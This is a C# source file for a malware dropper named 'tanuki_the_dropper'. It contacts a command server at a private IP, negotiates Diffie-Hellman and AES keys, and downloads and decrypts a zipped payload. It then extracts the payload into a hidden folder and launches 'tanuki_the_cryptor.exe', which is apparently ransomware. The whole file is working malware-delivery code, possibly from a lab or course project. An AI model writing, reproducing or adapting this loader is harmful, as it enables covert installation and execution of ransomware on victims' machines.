using Packets;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO.Compression;
using System.Linq;
using System.Numerics;
using System.Text;
using System.Threading.Tasks;

namespace tanuki_the_dropper
{
    public class Dropper
    {
        private BigInteger dh_key;
        private BigInteger aes_key;

        private Communication comm = null;
        string server = "10.0.2.5";
        int port = 65432;

        private static string basePath = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
        private string zipPath = basePath + @"\malware.zip";
        private string extractFolder = basePath + @".\malware";

        private int RetryTimes = 3;
        private int WaitTime = 6000;

        public void Run()
        {
            Console.WriteLine(zipPath);
            for (int i = 0; i < RetryTimes; i++)
            {
                try
                {
                    Utility.ConsoleLog($"Start try {i}");

                    KeyGeneration();
                    ExeDownload();
                    ExecProgram(extractFolder + "\\tanuki_the_cryptor.exe");
                    break;
                }
                catch (Exception ex)
                {
                    Utility.ConsoleLog($"Error try {i}: {ex.Message}");
                    Task.Delay(WaitTime).Wait();
                }
            }
        }

        private void KeyGeneration()
        {
            BigInteger x;
            BigInteger gx;
            try
            {
                Utility.ConsoleLog("Opening connection with server. Sending request for DH parameters...");

                comm = new Communication(server, port);

                byte[] keyGenRequest_bytes = Packet.GenNewRequest("keyExchangeGen");

                comm.Start();

                comm.SendMessage(keyGenRequest_bytes);
                byte[] response_byte = comm.RecvMessage(1024);

                (string prime, string generator, string gx_server) = Packet.GetServerKeyParameters(response_byte);
                (x, gx, dh_key) = Cryptography.GenerateDHValues_X_GX_KEY(BigInteger.Parse(prime), BigInteger.Parse(generator), BigInteger.Parse(gx_server));

                byte[] parameters_bytes = Packet.SendClientParameters("keyExchangeAns", gx);
                comm.SendMessage(parameters_bytes);

                Utility.ConsoleLog($"DH Key hex: {dh_key.ToString("X")}");

                aes_key = new BigInteger(Cryptography.ComputeAESKey(dh_key.ToString("X")));

                Utility.ConsoleLog($"AES Key hex: {Convert.ToHexString(this.aes_key.ToByteArray())}");
            }
            catch (Exception ex)
            {
                Utility.ConsoleLog("Could not generate dropper's keys: " + ex.Message);

                if (comm != null)
                {
                    byte[] endRequest_bytes = Packet.GenNewRequest("endRequest");
                    comm.SendMessage(endRequest_bytes);
                }

                comm.Close();
                throw;
            }
        }

        private void ExeDownload()
        {
            Utility.ConsoleLog("Downloading malware...");

            CleanDownload();
            try
            {
                (byte[] exeZip_bytes, int bytesRead) = (null, 0);
                for (int i = 0; i < RetryTimes; i++)
                {
                    try
                    {
                        byte[] exeInfoRequest_bytes = Packet.GenNewRequest("exeSend");
                        comm.SendMessage(exeInfoRequest_bytes);

                        byte[] response_byte = Cryptography.AESDecrypt(comm.RecvMessage(4096), aes_key.ToByteArray());

                        (string serverHash, int serverSize) = Packet.GetExeInfo(response_byte);

                        (exeZip_bytes, bytesRead) = comm.RecvBinary(serverSize);

                        if (bytesRead != serverSize)
                        {
                            Utility.ConsoleLog("Zip size error.");
                            continue;
                        }

                        exeZip_bytes = Cryptography.AESDecrypt(exeZip_bytes, aes_key.ToByteArray());
                        string clientHash = Cryptography.GetHash(exeZip_bytes);

                        if (!clientHash.Equals(serverHash))
                        {
                            Utility.ConsoleLog("EXE hash error.");
                            Utility.ConsoleLog($"Hash server: {serverHash}");
                            Utility.ConsoleLog($"Client server: {clientHash}");
                            continue;
                        }

                        break;
                    }
                    catch (Exception ex) { Utility.ConsoleLog($"Error download malware: {ex.Message}"); if (i == 2) throw; }
                }

                Utility.ConsoleLog("Writing zip.");

                using (FileStream file = new FileStream(zipPath, FileMode.Create, FileAccess.Write))
                {
                    file.Write(exeZip_bytes, 0, exeZip_bytes.Length);
                }

                Utility.ConsoleLog("Extracting zip.");

                ZipFile.ExtractToDirectory(zipPath, extractFolder);

                DirectoryInfo extrDir = new DirectoryInfo(extractFolder);
                extrDir.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

                File.Delete(zipPath);

                Utility.ConsoleLog("Malware file received and saved.");

                foreach (string file in Directory.GetFiles(extractFolder))
                {
                    File.SetAttributes(file, File.GetAttributes(file) | FileAttributes.Hidden);
                }

                byte[] endRequest_bytes = Packet.GenNewRequest("endRequest");
                comm.SendMessage(endRequest_bytes);
   
            }
            catch (Exception ex)
            {
                Utility.ConsoleLog($"Error downloading\\extracting malware: {ex.Message}");

                CleanDownload();

                byte[] endRequest_bytes = Packet.GenNewRequest("endRequest");
                comm.SendMessage(endRequest_bytes);

                comm.Close();
                throw;
            }

        }
        private void ExecProgram(string fileName)
        {
            try
            {
                var proc = new Process();
                proc.StartInfo.FileName = fileName;

                proc.Start();
                proc.WaitForExit();
                var exitCode = proc.ExitCode;
                proc.Close();
            }
            catch (Exception ex) { Utility.ConsoleLog($"Error executing malware: {ex.Message}");  throw; }
        }

        private void CleanDownload()
        {
            if (File.Exists(zipPath)) { File.Delete(zipPath); }
            if (Directory.Exists(extractFolder))
            {
                foreach (string file in Directory.EnumerateFiles(extractFolder))
                    File.Delete(file);
                Directory.Delete(extractFolder);
            }
        }

    }
}
